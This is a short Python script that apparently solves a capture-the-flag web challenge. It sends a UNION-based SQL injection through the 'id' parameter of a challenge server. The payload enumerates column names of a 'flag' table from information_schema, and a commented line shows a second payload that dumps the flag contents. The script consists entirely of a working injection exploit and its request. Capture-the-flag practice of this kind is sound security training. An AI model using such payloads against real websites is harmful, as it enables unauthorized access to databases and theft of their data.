import requests


url = "http://funnytable.challs.havce.it:31346/post?id="

#   select title, content from posts where id = '' union select 1 as title, GROUP_CONCAT(f) as content from flag group by title

sql = "'' union select 'prova' as title, group_concat(column_name separator '') as content from information_schema.columns WHERE TABLE_NAME = 'flag' -- "

r = requests.get(url + sql)

print(r.text)